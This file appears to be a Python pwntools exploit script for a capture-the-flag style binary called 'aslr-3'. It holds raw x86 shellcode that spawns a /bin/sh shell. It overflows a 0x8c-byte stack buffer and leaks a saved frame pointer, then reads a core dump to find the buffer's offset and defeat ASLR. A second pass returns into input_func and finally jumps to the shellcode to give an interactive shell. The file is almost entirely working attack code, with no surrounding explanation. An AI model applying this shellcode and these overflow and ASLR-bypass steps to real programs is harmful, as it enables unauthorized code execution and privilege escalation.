from pwn import *

SHELLCODE ='\x90\x90\x90\x90\xb8\xca\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x80\x89\xc3\x89\xc1\xb8\xcc\x11\x11\x11\xc1\xe0\x18\xc1\xe8\x18\xcd\x801\xc0Phn/shh//bi\x89\xe31\xc91\xd2\xb8\x1b\x11\x11\x11\xc1\xe0\x1c\xc1\xe8\x1c\xcd\x80'

ARG1 = ''
ENV = {}
OFFSET = 0x00
INPUT_FUNC_ADDR = ELF("./aslr-3").symbols["input_func"]

# ENV = {'SHELLCODE': SHELLCODE}
# ARG1 = SHELLCODE

p = process(["aslr-3", ARG1], env=ENV)

# Recieve data from stdout
data = p.recvuntil("name:")

# Destroy return address
p.sendline(SHELLCODE + ('a' * (0x8c - len(SHELLCODE))) + 'aaaa')

# Leak address
data = p.recvuntil("print?\n")
p.sendline('300')

# Parse out leaked address
data = p.recv(300)
old_main_ebp = u32(data[0x94:0x94+4])

# Let it crash and search stack for buffer address
p.wait()
c = Core("./core")
buffer_addr = c.stack.find(SHELLCODE + ('a' * (0x8c - len(SHELLCODE))) + 'aaaa')

# Find offset between address and the buffer
offset = old_main_ebp - buffer_addr
print(hex(offset))

p = process(["aslr-3", ARG1], env=ENV)

# Recieve data from stdout
data = p.recvuntil("name:")

# Set return address to input func again without destroying the main stack
p.sendline('a' * 0x8c + p32(INPUT_FUNC_ADDR))

# Leak address
data = p.recvuntil("print?\n")
p.sendline('300')

# Parse out leaked address
data = p.recv(300)
new_main_ebp = u32(data[0x94:0x94+4])

# Calculate buffer address with the leak
new_buff_addr = new_main_ebp - offset

# Recieve data from stdout from second time through
data = p.recvuntil("name:")

# Set return address to shellcode
p.sendline(SHELLCODE + ('a' * (0x8c - len(SHELLCODE))) + p32(new_buff_addr))

# Interact with spawned shell.  Send a, not a number
p.interactive()
